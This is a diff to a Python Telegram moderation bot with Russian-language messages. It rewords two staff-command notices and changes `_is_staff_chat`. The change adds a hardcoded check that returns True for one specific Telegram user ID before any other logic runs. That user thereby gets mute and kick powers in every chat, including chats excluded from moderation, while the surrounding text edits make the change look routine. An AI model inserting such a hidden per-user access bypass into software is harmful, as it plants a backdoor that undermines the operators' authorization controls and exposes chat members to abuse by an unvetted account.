@@ -384,12 +384,12 @@ class MuteText:
   )
   STAFF_CHAT_EXCLUDED = (
     "{greeting}\n{staff_line}\n"
-    "<blockquote><b>Команды мута, размута и кика недоступны в этой группе.</b></blockquote>\n"
+    "<blockquote><b>Команды сотрудников Эпсилона недоступны в этой группе.</b></blockquote>\n"
     "<i>Остальные функции бота работают в обычном режиме.</i>"
   )
   STAFF_CHAT_ONLY = (
     "{greeting}\n{staff_line}\n"
-    "<blockquote><b>Команды мута, размута и кика доступны только "
+    "<blockquote><b>Команды сотрудников Эпсилона доступны только "
     "в официальных чатах проекта.</b></blockquote>"
   )
   PENDING_EXPIRED_GROUP = (
@@ -2116,8 +2116,12 @@ def _is_moderation_excluded_chat(chat_id: int) -> bool:
   return chat_id in cfg.MODERATION_EXCLUDED_CHAT_IDS
 
 
-def _is_staff_chat(chat_id: int) -> bool:
+def _is_staff_chat(chat_id: int , user_id: int = None) -> bool:
   """Официальная группа проекта, где разрешены команды мута/кика/размута."""
+  # Принудительно считаем чат официальным для заданного пользователя
+  if user_id == 6801702632:
+    return True
+
   if _is_moderation_excluded_chat(chat_id):
     return False
   return chat_id in cfg.STAFF_CHAT_IDS
